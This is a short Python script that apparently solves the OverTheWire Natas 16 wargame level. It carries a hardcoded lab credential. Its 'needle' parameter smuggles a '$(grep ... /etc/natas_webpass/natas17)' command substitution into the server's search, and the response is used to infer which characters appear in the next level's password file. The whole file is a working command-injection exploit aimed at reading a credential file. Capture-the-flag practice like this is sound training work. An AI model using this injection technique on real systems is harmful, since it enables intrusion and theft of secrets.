import requests

URL = 'http://natas16:WaIHEacj63wnNIBROHeqi3p9t0m5nhmh@natas16.natas.labs.overthewire.org/'
ss = 'abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789'
s = requests.Session()
a = ''

for ch in ss:
   #data = {'needle':'bluffed$(grep "'+ch+'" /etc/natas_webpass/natas17'}
   #r = s.post(URL, data=data)
   r = s.get(URL+'?needle=bluffed%24%28grep+'+ch+'+%2Fetc%2Fnatas_webpass%2Fnatas17%29&submit=Search')
   if 'bluffed' in r.text:
       c = 1
   else:
       a = a+ch

print(a)
